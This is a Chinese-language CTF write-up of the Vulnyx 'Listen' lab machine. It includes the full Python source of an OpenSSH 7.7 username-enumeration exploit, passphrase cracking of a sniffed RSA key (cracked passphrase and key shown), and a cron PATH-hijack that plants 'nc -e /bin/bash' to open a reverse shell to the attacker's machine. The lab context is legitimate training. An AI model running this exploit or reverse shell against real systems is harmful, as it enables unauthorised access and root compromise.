---
title: Vulnyx-Listen
date: 2024-06-08
categories: [Training platform,Vulnyx]
tags: [Vulnyx]    
---

#  (°ー°〃)Listen

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748537.png" alt="image-20240528150019928" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748539.png" alt="image-20240528162731310" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748541.png" alt="image-20240528163602756" style="zoom: 50%;" />

开打群主师傅推荐的第一台`vulnyx`靶机！

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Listen]
└─$ rustscan -a 172.20.10.3 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.3:22
Open 172.20.10.3:8000
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhemxEZcm98GFwIRozVUePnC+Cejni5lScAa7ha5neDlWQT2e6dbubOkddku/qgtgY4/kw/pGPh7oTqHg9WKHTMqTAzdN0DDaU/5twewwMf6s9ERuuYYieP7mzjsX2APhOr23CFWVr37Y+mQ/A4J0ODizpr/mggCCi6kqHqyRWgcPG98AVJ9IjPehVkptQdLpQlSOV8EzJClu6tBInWzxtGi5v0B94lMYRDXqZE9Z1wCSh9oU0HnwRwfFqB0dcOH+kDZVLYi06aiHKXkKgSFM3G6LJQY8ad4FCEc7TU+agLRPHFUPFqqPbf9hbDD7MUdR4pXEQtJ1p/D/9rdbBg1Sp
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+zmcUltQUYUVvvfWqtUjdFpCh0IkOnPjmcctTpnXS7MWK37n6h9DEq4WNsHmauyKEuRnml5mOLUbNIZHHUBgY=
|   256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNArrcR981CzORruPnEn/opg56t7SFktwnhZzGpXcfE
8000/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.7.3)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/3.7.3
```

```bash
┌──(kali💀kali)-[~/temp/Listen]
└─$ curl http://172.20.10.3:8000                                            
You just have to listen to open the door...
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Listen]
└─$ gobuster dir -u http://172.20.10.3:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.3:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 20630 / 220561 (9.35%)[ERROR] Get "http://172.20.10.3:8000/enlarge": dial tcp 172.20.10.3:8000: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/5082": dial tcp 172.20.10.3:8000: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/pantech": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/cursor": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/chairman": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/DA": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/Repository": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/sony-ericsson": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/reach": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/2002_03": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 28405 / 220561 (12.88%)[ERROR] Get "http://172.20.10.3:8000/strs": dial tcp 172.20.10.3:8000: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/3560": dial tcp 172.20.10.3:8000: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/5993": dial tcp 172.20.10.3:8000: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/4333": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/npp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/virusencyclo": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3:8000/4202": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 36205 / 220561 (16.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36222 / 220561 (16.42%)
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

没发现啥，尝试别的办法。

### 流量监听

没有隐藏窗口和奇怪的目录，尝试监听一下流量：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748542.png" alt="image-20240528164606622" style="zoom:50%;" />

可以看到，发了一个私钥，base64复制出来：

```apl
////////NC63CD2hCABFAAXcG8kgAEARgzGsFAoD/////8h9/egG10zDLS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsRjExOUYyMUY3NTdBQTAyRQoKNjBWRFRUQUVLTitHNDJVYWF6RjZTcFlEVm1yL3Y2bjJ2UDFGYWdzMjExbzZmNWkxM2xjUnZseHJEbk9yL1pUdgpobEZ1UkR3K2VkNFBIL2JsQ3VzVEJZRzgzSklhbFRUaWFxalZaTUhOZVozZG4wVkE0enVOZk0yYTFFUDVTWkZuCnBubXlIeFgzc3hpNnU4ajZGRUg3K05zQkkyanZWbFlUYkNMYUF0NmJBN3RCdjhxRUtoK1JiODdZZjRrS284ZmwKWkRuc2tIRGRJL2RqalVSL0EyNUp4UlhPZm4xU3EvL3NoVTFOV2xpK0NOalVoUU81SXJ1SmNlV0JBZzhrY2l1MApockpEL0V4cWJnT0R6c0hCRVl1WEUvQytJNVRRTlJKTFJYdnAwVkN3ZzloU0Mrc2Qyb3lHZG9rNE05Rml5bjZhCnE1MTdoalFxMkM1UGg4NVN4OHdtc3VRNG5BNVFYUjM3NVFjNVBrb2RsVnpyUVR6TkxDY2J0STZJV081bVFHV0IKQVVsRVYyNjljd3k2dFhxVlZoazdEQ09Yam9pZWtzcE1ONWZMbHlBQWUwY1RpTTlVazVBdzdoSWpuUjFad2VpdApoNGZXOXZxRzRmclhCakFKNnFuSHpaaWtOcU1nNk1VWVFtY0pDcGJVUGVHUHYvR2ZkK3dwVW5CR212UWtDdnozCjUrakc5U09MTHJkSEROQzZVMThoVDFsdWJUUHpnOGFFNGtkUXhRU3UyZ0tSTjhiWWlDTE5FcVpjU0NBTldtTXEKY203K2NVaVUvN1h4SWN6dlZxeWUyZWxXZ0NnYm8wbTRVU3dJZUVlTmNHV29QcWdZYUNmS3g2aVprWGZMTEp6MwpPUVE3Smd1Wk5zK3YrTjRNd3Y1WVNKZVZoT1dMU2tlUmcyUkplOG5OU0NvVHdsK2FEdk92cmJkOEdlY1pJZ1BLCmdYSEJrejNZV3RDTVR1M2M3QUF5T3ZPSWdEMW4zQU5uTmRNWFhLQXEwV2l1OFVEcUxERUlHMzJqRkUzeVUyRWYKQzlLd2UvU3VYTWF6THJ6ZDJRb0w2K3BJMExLK1cyT1lDY3NnTnVoSUhHK3RGNjc0WWIwLzRLNWZsVkFsR3FYVAp4Y3creEltRjV1ejFaTmVRbFM0ZndSM0QxOEFiZklyeDduaHNFMU1Xb0RpRXRKVlUwamNNK0pHaDNsRWxGQkZ2CmF4NktWR1J5QTFtZzhRZjNHbVp1eW5nKzFZTkMyeHNWSWJhNTJSVWxQZFJTWjZNb2xWeXROZlRQanN5enN3cGMKV1Z1ZmR4VThtZ0NTS0p3aHlkZ1BjMHdVOXAzMmtEQ25pTlpXbzg2Y1NZQ0JxcElpcG90a0hBamRENi9BWGhPVwp2ZUoycUx0c0hJaXFyazVJckRndUF0TWd4YkdkZ2lHTUhyT2N3WEt0TTJNQ1JOZzdpMWszbjYvYjJQM1h4MGpTCk1VRVlJR3lqUmwwMVkzcEdaaGZwWjR1UmtsWUVqZFQ5eGt0RnJmTnBoaXBRcWhpK3B3ZzQzY2V0dExWeFdyNE4KbEVSMjRITWtjMGpCV09XQStkZWhlRGR6U0IyamthRlNuNEpmVW51amVHbWhmU0pseGJab2hRNW56UUFwQUxLOApTcFp5RGM4ek9ndm1ZSXpUR1A4RWlmODZRTnJsTjBORHNzcncxcDhJbklidkdacjdBaXZqRnhsVUNWdFBlRGhHCjRkSjd6cUhUT0R0VllkSzNXWUhnMGpaTGtXM1FROVBIVzJTYWtEaEp3eFM2ci9WdGJPSi8rQUJsdTFvVUphMysKaFowc3hURUh0RnE=
////////NC63CD2hCABFAAEjG5AAuUARp2qsFAoD/////0VlejRxTC9jMW1GSnBSSnZ5ZHZRcFpiSytUTVN6dEJiaW9PNEx5UTgzWXdFRTY0Z3pNZkcyCk1DcTh2TDJLV1VoWlRuSVlTME9aSXA4Wmp4cDdXclVKWWRESDBVNEVGWlJJOGtRaHcya2ZPQTVndSthcEZPMVoKREdIZENLZ002WnhqQnBLUFpaM2hER21NQ2VETVA2SEtDZ2pRL01JWUZQN3kzK1lYcEJyS01BRlJ3d24xVmxYSQo1R0w2MUZ4TVRxMzBvQTNGRXNwVWtOMDZLOHlkLzg1TEs3WFMyT1h3U283QVFja0pnaEhzd2c9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

## 漏洞利用

### RSA破解连接

使用`cyberchef`对照改一下得到明文：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748543.png" alt="image-20240528165914359" style="zoom:50%;" />

```apl
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,F119F21F757AA02E

60VDTTAEKN+G42UaazF6SpYDVmr/v6n2vP1Fags211o6f5i13lcRvlxrDnOr/ZTv
hlFuRDw+ed4PH/blCusTBYG83JIalTTiaqjVZMHNeZ3dn0VA4zuNfM2a1EP5SZFn
pnmyHxX3sxi6u8j6FEH7+NsBI2jvVlYTbCLaAt6bA7tBv8qEKh+Rb87Yf4kKo8fl
ZDnskHDdI/djjUR/A25JxRXOfn1Sq//shU1NWli+CNjUhQO5IruJceWBAg8kciu0
hrJD/ExqbgODzsHBEYuXE/C+I5TQNRJLRXvp0VCwg9hSC+sd2oyGdok4M9Fiyn6a
q517hjQq2C5Ph85Sx8wmsuQ4nA5QXR375Qc5PkodlVzrQTzNLCcbtI6IWO5mQGWB
AUlEV269cwy6tXqVVhk7DCOXjoiekspMN5fLlyAAe0cTiM9Uk5Aw7hIjnR1Zweit
h4fW9vqG4frXBjAJ6qnHzZikNqMg6MUYQmcJCpbUPeGPv/Gfd+wpUnBGmvQkCvz3
5+jG9SOLLrdHDNC6U18hT1lubTPzg8aE4kdQxQSu2gKRN8bYiCLNEqZcSCANWmMq
cm7+cUiU/7XxIczvVqye2elWgCgbo0m4USwIeEeNcGWoPqgYaCfKx6iZkXfLLJz3
OQQ7JguZNs+v+N4Mwv5YSJeVhOWLSkeRg2RJe8nNSCoTwl+aDvOvrbd8GecZIgPK
gXHBkz3YWtCMTu3c7AAyOvOIgD1n3ANnNdMXXKAq0Wiu8UDqLDEIG32jFE3yU2Ef
C9Kwe/SuXMazLrzd2QoL6+pI0LK+W2OYCcsgNuhIHG+tF674Yb0/4K5flVAlGqXT
xcw+xImF5uz1ZNeQlS4fwR3D18AbfIrx7nhsE1MWoDiEtJVU0jcM+JGh3lElFBFv
ax6KVGRyA1mg8Qf3GmZuyng+1YNC2xsVIba52RUlPdRSZ6MolVytNfTPjsyzswpc
WVufdxU8mgCSKJwhydgPc0wU9p32kDCniNZWo86cSYCBqpIipotkHAjdD6/AXhOW
veJ2qLtsHIiqrk5IrDguAtMgxbGdgiGMHrOcwXKtM2MCRNg7i1k3n6/b2P3Xx0jS
MUEYIGyjRl01Y3pGZhfpZ4uRklYEjdT9xktFrfNphipQqhi+pwg43cettLVxWr4N
lER24HMkc0jBWOWA+deheDdzSB2jkaFSn4JfUnujeGmhfSJlxbZohQ5nzQApALK8
SpZyDc8zOgvmYIzTGP8Eif86QNrlN0NDssrw1p8InIbvGZr7AivjFxlUCVtPeDhG
4dJ7zqHTODtVYdK3WYHg0jZLkW3QQ9PHW2SakDhJwxS6r/VtbOJ/+ABlu1oUJa3+
hZ0sxTEHtFqEez4qL/c1mFJpRJvydvQpZbK+TMSztBbioO4LyQ83YwEE64gzMfG2
MCq8vL2KWUhZTnIYS0OZIp8Zjxp7WrUJYdDH0U4EFZRI8kQhw2kfOA5gu+apFO1Z
DGHdCKgM6ZxjBpKPZZ3hDGmMCeDMP6HKCgjQ/MIYFP7y3+YXpBrKMAFRwwn1VlXI
5GL61FxMTq30oA3FEspUkN06K8yd/85LK7XS2OXwSo7AQckJghHswg==
-----END RSA PRIVATE KEY-----
```

加密过的密钥，先尝试破解一下吧：

```bash
┌──(kali💀kali)-[~/temp/Listen]
└─$ vim listen 

┌──(kali💀kali)-[~/temp/Listen]
└─$ chmod 600 listen

┌──(kali💀kali)-[~/temp/Listen]
└─$ ssh2john listen > hash

┌──(kali💀kali)-[~/temp/Listen]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
idontknow        (listen)     
1g 0:00:00:00 DONE (2024-05-28 05:08) 3.225g/s 4180p/s 4180c/s 4180C/s cuties..rangers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

# 或者尝试RSAcrack破解，我也试了一下：
┌──(kali💀kali)-[~/temp/Listen]
└─$ rsacrack -w /usr/share/wordlists/rockyou.txt -k listen

╭━━━┳━━━┳━━━╮          ╭╮  
┃╭━╮┃╭━╮┃╭━╮┃          ┃┃  
┃╰━╯┃╰━━┫┃ ┃┣━━┳━┳━━┳━━┫┃╭╮
┃╭╮╭┻━━╮┃╰━╯┃╭━┫╭┫╭╮┃╭━┫╰╯╯
┃┃┃╰┫╰━╯┃╭━╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮
╰╯╰━┻━━━┻╯ ╰┻━━┻╯╰╯╰┻━━┻╯╰╯
-=========================-
[*] Cracking: listen
[*] Wordlist: /usr/share/wordlists/rockyou.txt
[i] Status:
    1283/14344392/0%/idontknow
[+] Password: idontknow Line: 1283
```

得尝试得到用户名，没有找到，尝试搜索一下相关漏洞，前面发现了`OpenSSH 7.7`的版本，看一下是否有相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748544.png" alt="image-20240528171723427" style="zoom: 33%;" />

发现第三个是我们想要的，可以得到用户进行连接！但是这个是`python2`的，尝试换一个`python3`的:

```bash
#!/usr/bin/env python3

import argparse, logging, paramiko, socket, sys, os


class InvalidUsername(Exception):
	pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
	pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
		paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
	old_add_boolean = paramiko.message.Message.add_boolean
	paramiko.message.Message.add_boolean = add_boolean
	result = old_service_accept(*args, **kwargs)
	paramiko.message.Message.add_boolean = old_add_boolean
	return result

# call when username was invalid 
def invalid_username(*args, **kwargs):
	raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# Print valid users found out so far
def print_result(valid_users):
	if(valid_users):
		print("Valid Users: ")
		for user in valid_users:
			print(user)
	else:
		print("No valid user detected.")

# perform authentication with malicious packet and username
def check_user(username):
	try:
		sock = socket.socket()
		sock.connect((args.target, int(args.port)))
		transport = paramiko.transport.Transport(sock)
		transport.start_client(timeout=0.5)

	except paramiko.ssh_exception.SSHException:
		print('[!] Failed to negotiate SSH transport')
		sys.exit(2)

	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
	except paramiko.ssh_exception.AuthenticationException:
		print("[+] {} is a valid username".format(username))
		return True
	except:
		print("[-] {} is an invalid username".format(username))
		return False

def check_userlist(wordlist_path):
	if os.path.isfile(wordlist_path):
		valid_users = []
		with open(wordlist_path) as f:
			for line in f:
				username = line.rstrip()
				try:
					if(check_user(username)):
						valid_users.append(username)
				except KeyboardInterrupt:
					print("Enumeration aborted by user!")
					break;

		print_result(valid_users)
	else:
		print("[-] {} is an invalid wordlist file".format(wordlist_path))
		sys.exit(2)

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--user', dest='username',  help="Username to check for validity.")
parser.add_argument('-w', '--wordlist', dest='wordlist', help="username wordlist")

if len(sys.argv) == 1:
	parser.print_help()
	sys.exit(1)

args = parser.parse_args()

if args.wordlist:
	check_userlist(args.wordlist)
elif args.username:
	check_user(args.username)
else:
	print("[-] Username or wordlist must be specified!\n")
	parser.print_help()
	sys.exit(1)
```

使用一下：

```bash
┌──(kali💀kali)-[~/temp/Listen]
└─$ python3 exp.py 172.20.10.3 -p 22 -w /usr/share/seclists/Usernames/Names/names.txt  
---------------
[+] abel is a valid username
---------------
[-] amnish is an invalid username
[-] amnon is an invalid username
^CEnumeration aborted by user!
Valid Users: 
abel
```

找到用户名，尝试进行连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748545.png" alt="image-20240528173214096" style="zoom:50%;" />

## 提权

### 先提升一下交互shell

```bash
abel@listen:~$ bash
abel@listen:~$ ls -la
total 32
drwx------ 4 abel abel 4096 Jun  3  2023 .
drwxr-xr-x 3 root root 4096 Jun  3  2023 ..
lrwxrwxrwx 1 root root    9 Jun 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 abel abel  220 Jun 12  2021 .bash_logout
-rw-r--r-- 1 abel abel 3526 Jun 12  2021 .bashrc
drwxr-xr-x 3 abel abel 4096 Jun  3  2023 .local
-rw-r--r-- 1 abel abel   66 Jun 12  2021 .selected_editor
drwx------ 2 abel abel 4096 Jun  3  2023 .ssh
-r-------- 1 abel abel   33 Jun  3  2023 user.txt
abel@listen:~$ cat user.txt 
33f3f86a697126c6fe0a39a337ade21a
```

### 信息搜集

```bash
abel@listen:~$ sudo -l
bash: sudo: command not found
abel@listen:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
abel@listen:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
abel@listen:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/dev/shm:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root cp /var/www/html/index.html /tmp
cat: /etc/cron.weekly: Is a directory
```

### 环境变量提权

发现了一个`root`级别的定时任务，且使用的是相对位置并非绝对位置，尝试进行提权：

```bash
abel@listen:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
abel@listen:~$ cd /tmp
abel@listen:/tmp$ nc
Cmd line: ^C
abel@listen:/tmp$ nc -h
[v1.10-41.1]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
abel@listen:/tmp$ echo 'nc -e /bin/bash 172.20.10.8 1234' > cp
abel@listen:/tmp$ cat cp
nc -e /bin/bash 172.20.10.8 1234
abel@listen:/tmp$ chmod +x cp
abel@listen:/tmp$ PATH=$PWD:$PATH
abel@listen:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

一直没弹回来，一看发现：

```bash
abel@listen:/tmp$ whereis cp
cp: /usr/bin/cp /tmp/cp /usr/share/man/man1/cp.1.gz
abel@listen:/tmp$ ls -l /var/www/html/index.html
-rw-r--r-- 1 abel abel 44 Jun  3  2023 /var/www/html/index.html
```

看来得改成定时任务中的环境变量：

```bash
PATH=/usr/local/sbin:/dev/shm:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

```bash
abel@listen:/tmp$ ls
cp  index.html  systemd-private-70889ce703d848a9984da2a35b149e95-systemd-timesyncd.service-Y3Mvyk
abel@listen:/tmp$ cat cp
nc -e /bin/bash 172.20.10.8 1234
abel@listen:/tmp$ cd /dev/shm
abel@listen:/dev/shm$ ls -la
total 0
drwxrwxrwt  2 root root   40 May 28 10:22 .
drwxr-xr-x 17 root root 3180 May 28 10:22 ..
abel@listen:/dev/shm$ echo 'nc -e /bin/bash 172.20.10.8 1234' > cp;chmod +x cp
abel@listen:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root root   60 May 28 11:45 .
drwxr-xr-x 17 root root 3180 May 28 10:22 ..
-rwxr-xr-x  1 abel abel   33 May 28 11:45 cp
```

这时候路径就对了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405281748546.png" alt="image-20240528174739270" style="zoom: 50%;" />

拿下rootshell！！！！

## 参考

https://youtu.be/ndCbbo0SWI0

https://0x-noname.github.io/writeups/nyx/listen

https://github.com/wolffart-luca/Vulnyx/blob/main/listen.md

https://www.bilibili.com/video/BV1mU411o7pQ

